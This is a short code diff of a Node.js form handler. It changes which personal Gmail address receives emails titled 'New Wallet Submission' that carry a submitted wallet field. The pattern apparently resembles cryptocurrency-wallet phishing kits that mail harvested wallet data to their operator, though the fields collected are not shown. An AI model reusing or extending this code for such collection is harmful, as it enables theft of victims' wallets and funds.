@@ -21,7 +21,7 @@ const handleSubmission = async (req, res) => {
 
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: "Tomotelechristopher25@gmail.com",
+      to: "Tomoteletoyese@gmail.com",
       subject: `New Wallet Submission - ${wallet}`,
       text: `
         Wallet: ${wallet || "N/A"}
